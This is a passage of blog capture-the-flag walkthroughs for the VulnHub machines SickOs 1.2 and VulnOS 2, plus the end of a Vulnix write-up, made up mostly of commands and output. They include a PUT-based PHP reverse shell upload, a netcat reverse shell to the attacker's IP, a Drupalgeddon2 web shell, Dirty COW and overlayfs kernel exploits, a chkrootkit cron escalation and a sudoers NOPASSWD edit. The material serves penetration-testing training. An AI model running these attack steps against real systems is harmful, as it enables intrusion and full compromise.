<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span>sudoedit /etc/exports
</code></pre></div></div>

<p><img src="/assets/images/vulnix/screenshot-1.png" alt="" /></p>

<p>Then we reboot the virtual machine for the changes to take effect, we mount the directory /etc and add to the sudoers file the user vulnix and thus be able to execute any command as sudo without password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>2 192.168.179.174:/etc /mnt/nfs <span class="nt">-o</span> nolock

root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'vulnix ALL=(ALL) NOPASSWD:ALL'</span> <span class="o">&gt;&gt;</span> /mnt/nfs/sudoers
</code></pre></div></div>

<p>We execute the following command and get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span><span class="nb">sudo </span>su -
root@vulnix:~# <span class="nb">ls
</span>trophy.txt
root@vulnix:~# <span class="nb">cat </span>trophy.txt 
cc614640424f5bd60ce5d5264899c3be
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - SickOs 1.2</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system.</p>

<p><strong>Author:</strong> D4rk</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/sickos-12,144/">https://www.vulnhub.com/entry/sickos-12,144/</a></p>

<h2 id="informtion-gathering">Informtion Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>An scan with netdiscover located our target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.173 08:00:27:52:bc:30      1      60  PCS Systemtechnik GmbH
 192.168.179.254 00:50:56:f8:bb:a0      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap discovered two available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">--open</span> 192.168.179.173 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Version detection and script scanning were performed with nmap in order to discover more information about open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-n</span> <span class="nt">-v</span> 192.168.179.173 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="o">(</span>RSA<span class="o">)</span>
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp open  http    lighttpd 1.4.28
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn<span class="s1">'t have a title (text/html)
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The home page of the web application contains an image but it doesn’t reveals anything important.</p>

<p><img src="/assets/images/sickos1.2/screenshot-1.png" alt="" /></p>

<p>By running dirsearch it was possible detect only one directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.179.173/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...
<span class="o">[</span>16:17:30] 301 -    0B  - /test  -&gt;  http://192.168.179.173/test/
<span class="o">[</span>16:43:10] 403 -  345B  - /%7Echeckout%7E 
</code></pre></div></div>

<p><img src="/assets/images/sickos1.2/screenshot-2.png" alt="" /></p>

<p>After a long enumeration with no results, it occurs to me to check for the http methods.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-X</span> OPTIONS http://192.168.179.173/test/ 
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Allow: OPTIONS, GET, HEAD, POST
Content-Length: 0
Date: Tue, 14 Dec 2021 02:23:02 GMT
Server: lighttpd/1.4.28
</code></pre></div></div>

<p>As we can see the PUT verb is available, then we will use it to create a malicious php file on the server.</p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="put-method">PUT Method</h3>

<p>We copy the pentest monkey reverse shell to our current directory, we change the ip addres to ours and the port.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php rev-shell.php

root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> rev-shell.php
</code></pre></div></div>

<p>I developed a python script to upload the php reverse shell to the server.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Usage: {} shell.php"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]).</span><span class="n">read</span><span class="p">()</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">"http://192.168.179.173/test/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">status</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span>

    <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">201</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"File {} created."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>

<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="nb">ConnectionError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">err</span><span class="p">))</span>
</code></pre></div></div>

<p>We run the script adding as parameter the php file that contains the reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 uploader.py rev-shell.php                              
File rev-shell.php created.
</code></pre></div></div>

<p>As we see the file was created on the server.</p>

<p><img src="/assets/images/sickos1.2/screenshot-3.png" alt="" /></p>

<p>Then set up a netcat listener on port 443 and click on <strong>rev-shell.php</strong>.</p>

<p><img src="/assets/images/sickos1.2/screenshot-4.png" alt="" /></p>

<p>We have a shell as www-data user and we upgrade it to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.173] 42540
Linux ubuntu 3.11.0-15-generic <span class="c">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux</span>
 07:15:35 up 4 min,  0 <span class="nb">users</span>,  load average: 0.12, 0.34, 0.19
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ python -c "import pty; pty.spawn('</span>/bin/bash<span class="s1">')"
www-data@ubuntu:/$
</span></code></pre></div></div>

<p>We check the kernel version.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="nb">uname</span> <span class="nt">-a</span>
Linux ubuntu 3.11.0-15-generic <span class="c">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux</span>
</code></pre></div></div>

<p>This kernel version is out to date, so it is vulnerable to kernel exploit.</p>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="kernel-exploit">Kernel Exploit</h3>
<p><strong>Method 1</strong></p>

<p>Dirty COW (Dirty copy-on-write) is a computer security vulnerability for the Linux kernel that affected all Linux-based operating systems, including Android devices, that used older versions of the Linux kernel created before 2018.</p>

<p>We download the exploit, and start a php web server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/40839 <span class="nt">-O</span> dirtyc0w.c

root@kali:~<span class="nv">$ </span>php <span class="nt">-S</span> 192.168.179.1:443
</code></pre></div></div>

<p>On the target machine we download the exploit, compile it and execute it adding as parameter the password for the user firefart.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span>wget 192.168.179.1:443/dirtyc0w.c

www-data@ubuntu:/tmp<span class="nv">$ </span>gcc <span class="nt">-pthread</span> dirtyc0w.c <span class="nt">-o</span> dirtyc0w <span class="nt">-lcrypt</span>
gcc <span class="nt">-pthread</span> dirtyc0w.c <span class="nt">-o</span> dirtyc0w <span class="nt">-lcrypt</span>
www-data@ubuntu:/tmp<span class="nv">$ </span>./dirtyc0w getr00t
./dirtyc0w getr00t
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: getr00t
Complete line:
firefart:fiRVK.ZqO.byw:0:0:pwned:/root:/bin/bash

mmap: b7758000
</code></pre></div></div>

<p>Then we change to the user firefart or login via SSH, so the root login is enabled for the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> firefart 192.168.179.173
 .oooooo..o  o8o            oooo          .oooooo.                 .o        .oooo.  
d8P<span class="s1">'    `Y8  `"'</span>            <span class="sb">`</span>888         d8P<span class="s1">'  `Y8b              o888      .dP""Y88b 
Y88bo.      oooo   .ooooo.   888  oooo  888      888  .oooo.o     888            ]8P'</span>
 <span class="sb">`</span><span class="s2">"Y8888o.  </span><span class="sb">`</span>888  d88<span class="s1">' `"Y8  888 .8P'</span>   888      888 d88<span class="o">(</span>  <span class="s2">"8     888          .d8P' 
     </span><span class="sb">`</span><span class="s2">"Y88b  888  888        888888.    888      888 </span><span class="sb">`</span><span class="s2">"Y88b.      888        .dP'    
oo     .d8P  888  888   .o8  888 </span><span class="sb">`</span>88b.  <span class="sb">`</span><span class="s2">88b    d88' o.  )88b     888  .o. .oP     .o
8""88888P'  o888o </span><span class="sb">`</span>Y8bod8P<span class="s1">' o888o o888o  `Y8bood8P'</span>  8<span class="s2">""</span>888P<span class="s1">'    o888o Y8P 8888888888
                                                                                     
                                                                By @D4rk36
firefart@192.168.179.173'</span>s password: 
Welcome to Ubuntu 12.04.4 LTS <span class="o">(</span>GNU/Linux 3.11.0-15-generic i686<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com/
New release <span class="s1">'14.04.4 LTS'</span> available.
Run <span class="s1">'do-release-upgrade'</span> to upgrade to it.

Last login: Tue Apr 26 03:57:15 2016 from 192.168.0.100
firefart@ubuntu:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>firefart<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
firefart@ubuntu:~# <span class="nb">ls
</span>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  7d03aaa2bf93d80040f3f22ec6ad9d5a.txt  chkrootkit-0.49  newRule

firefart@ubuntu:~# <span class="nb">cat </span>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt 
WoW! If you are viewing this, You have <span class="s2">"Sucessfully!!"</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="k">in </span>real scenarios where tools can be blocked during an assesment and thereby fooling tester<span class="o">(</span>s<span class="o">)</span>, gathering more information about the target using different methods, though <span class="k">while </span>developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks <span class="k">for </span>giving this try.

@vulnhub: Thanks <span class="k">for </span>hosting this UP!
</code></pre></div></div>

<h3 id="chkrootkit-049">Chkrootkit 0.49</h3>
<p><strong>Method 2</strong></p>

<p>Another way is via chkrootkit is a common Unix-based program intended to help system administrators check their system for known rootkits.</p>

<p>As we can see, the victim machine contains a vulnerable version of chkrootkit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span>chkrootkit <span class="nt">-V</span>
chkrootkit <span class="nt">-V</span>
chkrootkit version 0.49

www-data@ubuntu:/tmp<span class="nv">$ </span>find /etc/cron<span class="k">*</span> <span class="nt">-name</span> <span class="s1">'chkrootkit'</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
&lt;/etc/cron<span class="k">*</span> <span class="nt">-name</span> <span class="s1">'chkrootkit'</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null                
<span class="nt">-rwxr-xr-x</span> 1 firefart root 2032 Jun  4  2014 /etc/cron.daily/chkrootkit
</code></pre></div></div>

<p>We download the exploit to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>https://www.exploit-db.com/download/33899
</code></pre></div></div>

<p>Reading the exploit instructions, what the following commands do is create a file named update in the /tmp directory, we assign it execution permissions to be executed by the cron job chkrootkit and create as root a copy of /bin/sh to the /tmp directory and grant it SUID permissions and finally we execute ./sh to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'cp /bin/sh /tmp; chmod 4777 /tmp/sh'</span> <span class="o">&gt;</span> update
<span class="nb">echo</span> <span class="s1">'cp /bin/sh /tmp; chmod 4777 /tmp/sh'</span> <span class="o">&gt;</span> update
www-data@ubuntu:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x update
<span class="nb">chmod</span> +x update

www-data@ubuntu:/tmp<span class="nv">$ </span><span class="nb">ls    
ls
</span>php.socket-0  sh  update
www-data@ubuntu:/tmp<span class="nv">$ </span>./sh
./sh
<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - VulnOS 2</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a vulnerable virtual machine designed to improve penetration testing skills.</p>

<p><strong>Author:</strong> c4b3rw0lf</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/vulnos-2,147/">https://www.vulnhub.com/entry/vulnos-2,147/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan was performed to locate the target host, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.172 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP/UDP scan was performed to detect open ports with unicornscan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.172:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3  <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.172:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
...
TCP open                     ssh[   22]         from 192.168.179.172  ttl 64 
TCP open                    http[   80]         from 192.168.179.172  ttl 64 
TCP open                     irc[ 6667]         from 192.168.179.172  ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan was performed to detect more information about the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,6667 192.168.179.172 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b <span class="o">(</span>DSA<span class="o">)</span>
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 <span class="o">(</span>RSA<span class="o">)</span>
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web page contains a link called <strong>website</strong>, we click on it.</p>

<p><img src="/assets/images/vulnos2/screenshot-1.png" alt="" /></p>

<p>Another web page is displayed on the screen, looking at the source it was possible to detect that it’s a Drupal 7.</p>

<p><img src="/assets/images/vulnos2/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/vulnos2/screenshot-3.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="remote-code-execution">Remote Code Execution</h3>

<p>A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised.</p>

<p>We download the exploit and install the dependencies.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>git clone https://github.com/dreadlocked/Drupalgeddon2
root@kali:~<span class="nv">$ </span><span class="nb">cd </span>Drupalgeddon2 
root@kali:~/Drupalgeddon2<span class="nv">$ </span>gem <span class="nb">install </span>highline
Successfully installed highline-2.0.3
Parsing documentation <span class="k">for </span>highline-2.0.3
Done installing documentation <span class="k">for </span>highline after 10 seconds
1 gem installed
</code></pre></div></div>

<p>We run the exploit adding the target URL as parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Drupalgeddon2<span class="nv">$ </span>./drupalgeddon2.rb http://192.168.179.172/jabc/
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nt">--</span><span class="o">==[</span>::#Drupalggedon2::]<span class="o">==</span><span class="nt">--</span>
<span class="nt">--------------------------------------------------------------------------------</span>
<span class="o">[</span>i] Target : http://192.168.179.172/jabc/
<span class="nt">--------------------------------------------------------------------------------</span>
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/CHANGELOG.txt    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/core/CHANGELOG.txt    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
<span class="o">[</span>+] Found  : http://192.168.179.172/jabc/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
<span class="o">[!]</span> WARNING: Could be a false-positive <span class="o">[</span>1-1], as the file could be reported to be missing
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/core/includes/bootstrap.inc    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/includes/database.inc    <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
<span class="o">[</span>+] Header : v7 <span class="o">[</span>X-Generator]
<span class="o">[</span>+] Found  : http://192.168.179.172/jabc/    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
<span class="o">[</span>+] Metatag: v7.x <span class="o">[</span>Generator]
<span class="o">[!]</span> MISSING: http://192.168.179.172/jabc/    <span class="o">(</span>HTTP Response: 200<span class="o">)</span>
<span class="o">[</span>+] Drupal?: v7.x
<span class="nt">--------------------------------------------------------------------------------</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing: Form   <span class="o">(</span>user/password<span class="o">)</span>
<span class="o">[</span>+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Testing: Clean URLs
<span class="o">[!]</span> Result : Clean URLs disabled <span class="o">(</span>HTTP Response: 404<span class="o">)</span>
<span class="o">[</span>i] Isn<span class="s1">'t an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo OZVTAGPS
[+] Result : OZVTAGPS
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.179.172/jabc/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : &lt;?php if( isset( $_REQUEST['</span>c<span class="s1">'] ) ) { system( $_REQUEST['</span>c<span class="s1">'] . '</span> 2&gt;&amp;1<span class="s1">' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl '</span>http://192.168.179.172/jabc/shell.php<span class="s1">' -d '</span><span class="nv">c</span><span class="o">=</span><span class="nb">hostname</span><span class="s1">'
VulnOSv2&gt;&gt; whereis nc
nc: /bin/nc /bin/nc.traditional /usr/share/man/man1/nc.1.gz
</span></code></pre></div></div>

<p>As we can see the exploitation was successful, then we set up a netcat listener on port 443 and execute the following netcat instruction:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VulnOSv2&gt;&gt; nc 192.168.179.1 443 <span class="nt">-e</span> /bin/bash
</code></pre></div></div>

<p>We got a shell with low privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.172] 49471
python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
www-data@VulnOSv2:/var/www/html/jabc<span class="err">$</span>
</code></pre></div></div>

<p>This kernel version is vulnerable to the following exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@VulnOSv2:/var/www/html/jabc<span class="nv">$ </span><span class="nb">cat</span> /proc/version
<span class="nb">cat</span> /proc/version
Linux version 3.13.0-24-generic <span class="o">(</span>buildd@komainu<span class="o">)</span> <span class="o">(</span>gcc version 4.8.2 <span class="o">(</span>Ubuntu 4.8.2-19ubuntu1<span class="o">)</span> <span class="o">)</span> <span class="c">#47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit ubuntu 3.13.0                                                                                       
<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
 Exploit Title                                                                                             |  Path                   
<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
Linux Kernel 3.13.0 &lt; 3.19 <span class="o">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="o">)</span> - <span class="s1">'overlayfs'</span> Local Privilege Escalation       | linux/local/37292.c
...
<span class="nt">-----------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="kernel-exploit">Kernel Exploit</h3>

<p>The overlayfs implementation in the linux (aka Linux kernel) package before3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissionsfor file creation in the upper filesystem directory, which allows localusers to obtain root access by leveraging a configuration in whichoverlayfs is permitted in an arbitrary mount namespace.</p>

<p>We copy the exploit to our current directory and start a web server with python.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/37292.c

root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>On the target machine we download it, compile it and execute it. As we can see now we are root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@VulnOSv2:/tmp<span class="nv">$ </span>wget 192.168.179.1/37292.c <span class="nt">-O</span> ofs.c

www-data@VulnOSv2:/tmp<span class="nv">$ </span>gcc ofs.c <span class="nt">-o</span> ofs
gcc ofs.c <span class="nt">-o</span> ofs
www-data@VulnOSv2:/tmp<span class="nv">$ </span>./ofs
./ofs
spawning threads
mount <span class="c">#1</span>
mount <span class="c">#2</span>
child threads <span class="k">done</span>
/etc/ld.so.preload created
creating shared library
<span class="c"># id</span>
<span class="nb">id
